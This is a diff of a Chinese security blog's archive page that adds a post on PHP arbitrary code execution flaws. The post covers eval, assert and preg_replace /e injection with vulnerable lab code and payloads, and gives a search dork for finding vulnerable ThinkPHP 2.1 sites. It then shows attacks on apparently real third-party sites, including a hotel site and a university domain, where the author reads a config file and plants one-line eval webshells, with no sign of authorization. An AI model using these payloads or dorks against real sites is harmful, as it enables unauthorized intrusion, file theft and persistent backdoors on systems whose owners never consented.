@@ -64,6 +64,65 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="../../2016/07/30/任意代码执行漏洞/" class="article-date">
+  <time datetime="2016-07-30T12:20:08.000Z" itemprop="datePublished">2016-07-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="../../2016/07/30/任意代码执行漏洞/">任意代码执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>漏洞原理</strong><br>：<br>当应用调用一些能将字符串转换为代码的函数时，没有考虑安全性，用户是否可以控制这个字符，造成代码注入漏洞，如php中的eval函数，可以将字符串代表的代码作为php代码执行<br><strong>相关函数</strong><br>：<br>php:eval assert<br>python:exec<br>phpcms中的string2array函数<br>array(  //这个是字符串形式的数组，它并不是数组，而是字符串<br>    ‘upload_maxsize’ =&gt; ‘2048’,<br>    ‘upload_allowext’ =&gt; ‘jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf’,<br>    ‘watermark_enable’ =&gt; ‘1’,<br>    ‘watermark_minwidth’ =&gt; ‘300’,<br>    ‘watermark_minheight’ =&gt; ‘300’,<br>    ‘watermark_img’ =&gt; ‘/statics/images/water/mark.png’,<br>    ‘watermark_pct’ =&gt; ‘85’,<br>    ‘watermark_quality’ =&gt; ‘80’,<br>    ‘watermark_pos’ =&gt; ‘9’,<br>)<br>function string2array($data) {<br>    //这个函数可以将字符串$data转化为数组<br>    if($data == ‘’)<br>        return array();<br>    @eval(“\$array = $data;”);<br>        return $array;<br>}<br><strong>漏洞危害</strong><br>：<br>执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">让网站写shell</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
+<p><strong>漏洞分类</strong><br>：<br>执行代码的函数：eval.assert<br>callback函数：preg_replace+ /e模式<br>反序列化：unserialize()反序列化函数<br><strong>漏洞挖掘</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">框架找漏洞，如thinkphp:</div><div class="line">inurl:index.php intext:Thinkphp 2.1</div><div class="line">框架的URL格式如下：</div><div class="line"> Site:Port/Module name/Method name/Property name/Preperty value</div><div class="line"> Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value</div><div class="line"> </div><div class="line"> www.xx.com:88/News/show/id/328</div><div class="line"> www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23</div></pre></td></tr></table></figure></p>
+<p> <strong>搭建环境的代码</strong><br>是四个代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">eval(&quot;\$ret = $data;&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://192.168.188.66/code_inject/2/?data=&apos;);phpinfo();//</div><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = &apos;$data&apos;;&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(&apos;$data&apos;);&quot;);</div><div class="line">eval(&quot;\$ret = strtolower(&apos;&apos;);phpinfo();// &apos;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo &quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;;</div><div class="line">eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);</div><div class="line">echo $ret;</div></pre></td></tr></table></figure>
+<p><a href="http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=&quot;);phpinfo();//</a><br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> phpinfo()})<br><a href="http://192.168.188.66/code_inject/3/?data=(&#39;${" target="_blank" rel="external">http://192.168.188.66/code_inject/3/?data=(&#39;${</a> @eval($_POST[99])})</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = $_GET[&apos;data&apos;];</div><div class="line">echo $data;</div><div class="line">preg_replace(&apos;/&lt;data&gt;(.*)&lt;\/data&gt;/e&apos;, &apos;$ret = &quot;\\1&quot;;&apos;, $data);</div><div class="line">echo $ret;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;$&#123; phpinfo()&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=%3Cdata%3E&#123;$&#123;phpinfo()&#125;&#125;%3C/data%3E</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</div><div class="line">http://192.168.188.66/code_inject/4/?data=&lt;data&gt;&#123;$&#123; @eval($_POST[99])&#125;&#125;&lt;/data&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20exit(phpinfo())%7D</a><br>exit（）不显示多余的信息<br><a href="http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D" target="_blank" rel="external">http://www.shichidachina.com/News/detail/item/$%7B%20phpinfo()%7D</a><br><strong>google搜索</strong><br>：intext:thinkphp intext:”Fast &amp; Simple OOP PHP Framework” intext:”2.1”<br>首先代码执行漏洞查找到一个站之后，点开站的根路径然后点可能跳转的目录，找到参数，在参数后面写上执行的测试代码</p>
+<p>($phpinfo())<br>index.php?m=module_name&amp;a=action_name&amp;id=1<br>/?m=module_name&amp;a=action_name&amp;id=1<br>/module_name&amp;a=action_name/id/1<br>module_name/action_name/id/1/page/2<br>/press/info/id/155<br>模块名/ 方法/参数/参数值<br>/press/info/id /${ phpinfo()}<br>找到两个存在代码执行漏洞的站<br>1.<img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/1.png?raw=true" alt="image"></p>
+<p>2.将参数值变成测试代码${phpinfo()<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/2.png?raw=true" alt="image"><br>获取当前工作的路径 {$ {print(getcwd())}}<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/3.png?raw=true" alt="image"><br>读取文件{$ {exit(var_dump(file_get_contents($_POST[f])))}}<br>f=d:/freehost/tianlonghotel/web/en/Conf/config.php</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/4.png?raw=true" alt="image"></p>
+<p>3.写webshell<br><a href="http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$" target="_blank" rel="external">http://www.tianlonghotel.com.cn/index2.php/Index/news/id/{$</a> {exit(var_dump(file_put_contents($_POST[f],$_POST[d])))}}<br>f=help2.php&amp;d=&lt;? eval($_POST[99])&gt;<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/5.png?raw=true" alt="image"></p>
+<p>没有权限换一种方式<br>${ @eval($_POST[99])}后面写上一句话木马<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/6.png?raw=true" alt="image"></p>
+<p>第二个网站<br>使用之前的方法找到之后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/7.png?raw=true" alt="image"><br>直接写一句话木马<br><a href="http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${" target="_blank" rel="external">http://bkjxgc.jlau.edu.cn/indxe.php/Notice/show/id/${</a> @eval($_POST[99])}</p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/8/8.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirzmwvff001od4hrkz5xym7e" class="article-share-link">Share</a>
+      
+        <a href="http://yoursite.com/2016/07/30/任意代码执行漏洞/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/执行/">执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="../../2016/07/29/命令执行漏洞/" class="article-date">
@@ -127,7 +186,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/29/命令执行漏洞/" data-id="cirzmdjts002dqshr9f0kbmcb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/29/命令执行漏洞/" data-id="cirzmwvfj001rd4hr4aac7got" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/29/命令执行漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -234,7 +293,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/26/文件上传之绕过上传/" data-id="cirzmdjt8001uqshrgw40y0bo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/26/文件上传之绕过上传/" data-id="cirzmwvg60024d4hr4kkjd1cr" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/26/文件上传之绕过上传/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -296,7 +355,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/26/文件上传/" data-id="cirzmdjso001oqshra7osbhp1" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/26/文件上传/" data-id="cirzmwvg10021d4hrkn7umpoo" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/26/文件上传/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -352,7 +411,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/22/xss实例/" data-id="cirzmdjse001gqshru2lyeqzw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/22/xss实例/" data-id="cirzmwvez001id4hrocgbaa66" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/22/xss实例/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -427,7 +486,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/18/xss的挖掘和利用/" data-id="cirzmdjse001iqshrqh9gv6ah" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/18/xss的挖掘和利用/" data-id="cirzmwvf6001md4hrx35360rv" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/18/xss的挖掘和利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -482,7 +541,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/18/google-hacking/" data-id="cirzmdjpm000aqshr0c4zpyvk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/18/google-hacking/" data-id="cirzmwvcj000ad4hrtfjsj87m" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/18/google-hacking/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -538,7 +597,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/16/centos配置nginx-php/" data-id="cirzmdjos0000qshrqs1yxrzb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/16/centos配置nginx-php/" data-id="cirzmwvc10004d4hr0laucekj" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/16/centos配置nginx-php/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -585,7 +644,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/15/csrf漏洞发掘和利用/" data-id="cirzmdjp20004qshrezfal63f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/15/csrf漏洞发掘和利用/" data-id="cirzmwvc40005d4hro8kqb7zi" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/15/csrf漏洞发掘和利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -660,57 +719,12 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/13/sql注入步骤/" data-id="cirzmdjru0017qshrx966zyvv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/13/sql注入步骤/" data-id="cirzmwved0016d4hrebd3oyak" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/13/sql注入步骤/#disqus_thread" class="article-comment-link">Comments</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/sql注入/">sql注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-渗透测试流程" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="../../2016/07/07/渗透测试流程/" class="article-date">
-  <time datetime="2016-07-07T00:58:31.000Z" itemprop="datePublished">2016-07-07</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="../../categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2016/07/07/渗透测试流程/">渗透测试流程</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#渗透测试流程：#<br>1.端口扫描<br>2.识别服务（看端口，nmap,经验,telnet看返回信息）<br>3.测试服务安全隐患（经验，查找对应漏洞，进行测试）<br>4.识别中间件服务（404页面，经验，http返回包）<br>5.测试对应中间件隐患<br>6.识别脚本语言（后缀，日常积累）<br>7.看网端漏洞/识别数据库（端口，报错）<br>8.测试数据库可能存在安全隐患<br>9.识别cms（power by, 后台，robots,txt（爬虫，不想被搜索到））,工具<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/Image.png?raw=true" alt="image"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/07/渗透测试流程/" data-id="cirzmdjti0027qshr4n98ra8n" class="article-share-link">Share</a>
-      
-        <a href="http://yoursite.com/2016/07/07/渗透测试流程/#disqus_thread" class="article-comment-link">Comments</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/流程/">流程</a></li></ul>
 
     </footer>
   </div>
@@ -774,6 +788,10 @@
       <ul>
         
           <li>
+            <a href="../../2016/08/18/ssrf漏洞/">ssrf漏洞</a>
+          </li>
+        
+          <li>
             <a href="../../2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
           </li>
         
@@ -787,10 +805,6 @@
         
           <li>
             <a href="../../2016/08/05/redis漏洞利用/">redis漏洞利用</a>
-          </li>
-        
-          <li>
-            <a href="../../2016/08/05/redis的安装/">redis的安装</a>
           </li>
         
       </ul>
